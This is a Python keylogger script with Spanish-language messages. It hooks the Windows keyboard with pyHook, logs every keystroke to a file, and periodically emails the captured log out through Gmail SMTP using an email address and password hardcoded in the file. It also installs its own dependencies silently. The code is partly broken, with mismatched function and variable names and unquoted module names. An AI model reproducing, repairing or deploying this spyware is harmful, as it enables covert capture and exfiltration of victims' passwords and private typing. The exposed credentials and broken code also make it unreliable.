import subprocess
import sys

def install_and_import(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)
install_and_import(pyHook)
install_and_import(pythoncom)
install_and_import(logging)


import pyHook, pythoncom, logging
import time, datetime

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = 'file_log.txt'

def install(package):
    subprocess.check_call([sys.executable,
     "-m", "pip", "install", package])



def TimeOut():
	if time.time() > timeout:
		return(True)
	else:
		return(False)

def SendEmail(user,pwd,recipient,subject,body):
	import smtplib

	gmail_user = user
	gmail_pass = pwd
	From = userB
	To = recipient if type(recipient) is list else [recipient]
	SUBJECT = subject
	TEXT = body

	message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
	""" % (FROM, ", ".join(TO), SUBJECT, TEXT)

	try:
		server =smtplib.SMTP("smtp.gmail.com", 587)
		server.ehlo()
		server.starttls()
		server.login(gmail_user,gmail_pass)
		server.sendmail(FROM,TO,message)
		server.close()
		print('Correo Enviado satisfactoriamente!')
	except:
		print('Error al mandar correo!')

def FormatAndSendLogEmail():
	with open(file_log, 'r+') as f:
		actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		data = f.read().replace('\n','');
		data = 'Log capturado a las: '+ actualdate + '\n' + data
		sendEmail('rasperrypineda@gmail.com','subastas12','rasperrypineda@gmail.com',
			'Nuevo log - '+actualdate, data)

		f.seek(0)
		f.truncate()
def OnKeyboardEvent(event):
	logging.basicConfig(filename = file_log, level= logging.DEBUG,
		format = '%(message)s')
	logging.log(10, chr(event.Ascii))
	return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
	if timeOut():
		FormatAndSendEmail()
		timeout = time.time() + wait_seconds

	pythoncom.PumpWaitingMessages()

